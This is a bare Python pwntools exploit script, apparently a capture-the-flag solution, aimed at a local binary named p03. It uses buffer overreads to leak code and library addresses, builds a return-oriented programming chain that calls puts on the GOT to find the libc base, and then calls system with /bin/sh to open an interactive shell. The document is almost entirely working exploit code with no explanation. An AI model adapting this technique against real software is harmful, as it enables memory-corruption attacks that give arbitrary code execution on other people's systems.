from pwn import *

#context.log_level="DEBUG"
p=process('./p03')

payload ='a'*(8*3)+'\x0a'
p.send(payload)
p.recvuntil('\x0a')
p.recvuntil('\x0a')
code="\x00"+p.recvuntil('\x0a').replace('\x0a','\x00')
code=code.ljust(8,'\x00')
code=u64(code)
log.info('code = '+hex(code))


payload ='a'*(8*7-1)
p.sendline(payload)
p.sendline('')
p.sendline('')
p.recvuntil('\x0a')
dylib=p.recvuntil('a').replace('a','').replace('\x0a','')
dylib=u64(dylib.ljust(8,'\x00'))+0x00007fff8aba7000-0x7fff8abac255
rsi=dylib+0x16c1
rdi=dylib+0x1899

put_plt=code+0x58
put_got=code+0x1028-0xf00
main=code


log.info('dylib : '+hex(dylib))
log.info('rdi : '+hex(rdi))
log.info('rsi : '+hex(rsi))

payload ="q"*0x18
payload+=p64(rdi)+p64(put_got)+p64(0)+p64(put_plt)+p64(code)
p.sendline(payload)
p.recvuntil('\x7f\n')
p.recvuntil('\x7f\n')
libc=p.recvuntil('\n').replace('\x0a','\x00').ljust(8,'\x00')
libc=u64(libc)-0x4447d
binsh=libc+0x8a489
system=libc+0x80c8e
log.info('libc : '+hex(libc))

payload ="a"*0x18
payload+=p64(rdi)+p64(binsh)+p64(0)+p64(rdi+2)+p64(system)


p.sendline(payload)


p.interactive()
